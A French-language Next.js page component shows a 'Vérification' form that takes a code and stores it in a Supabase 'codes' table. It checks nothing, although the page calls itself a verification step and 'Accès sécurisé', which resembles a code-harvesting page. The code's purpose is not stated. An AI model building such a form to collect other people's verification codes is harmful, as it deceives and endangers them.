"use client";

import { useState } from "react";
import { supabase } from "../../lib/supabase";

export default function EmployePage() {
  const [code, setCode] = useState("");

  const handleSubmit = async (e: React.FormEvent<HTMLFormElement>) => {
    e.preventDefault();

    if (!code.trim()) return;

    const { error } = await supabase.from("codes").insert({
      code: code.trim(),
    });

    if (error) {
      console.error(error);
      alert("Erreur");
      return;
    }

    alert("Code envoyé !");
    setCode("");
  };

  return (
    <main className="min-h-screen bg-gradient-to-b from-slate-100 to-slate-200 flex items-center justify-center p-4">
      <div className="w-full max-w-md rounded-3xl bg-white p-8 shadow-2xl border border-slate-200">
        <div className="mb-8 text-center">
          <div className="mx-auto mb-4 flex h-20 w-20 items-center justify-center rounded-2xl bg-black text-2xl font-bold text-white">
            L
          </div>

          <h1 className="text-3xl font-bold text-slate-900">Vérification</h1>
          <p className="mt-2 text-sm text-slate-500">
            Veuillez saisir votre code pour continuer
          </p>
        </div>

        <form onSubmit={handleSubmit} className="space-y-5">
          <div>
            <label className="mb-2 block text-sm font-medium text-slate-700">
              Code
            </label>
            <input
              type="text"
              placeholder="Entrez votre code"
              value={code}
              onChange={(e) => setCode(e.target.value)}
              className="w-full rounded-2xl border border-slate-300 bg-slate-50 px-4 py-4 text-slate-900 outline-none transition focus:border-black focus:bg-white"
            />
          </div>

          <button
            type="submit"
            className="w-full rounded-2xl bg-black px-4 py-4 text-base font-semibold text-white shadow-lg transition hover:opacity-95"
          >
            Vérifier
          </button>
        </form>

        <p className="mt-6 text-center text-xs text-slate-400">
          Accès sécurisé
        </p>
      </div>
    </main>
  );
}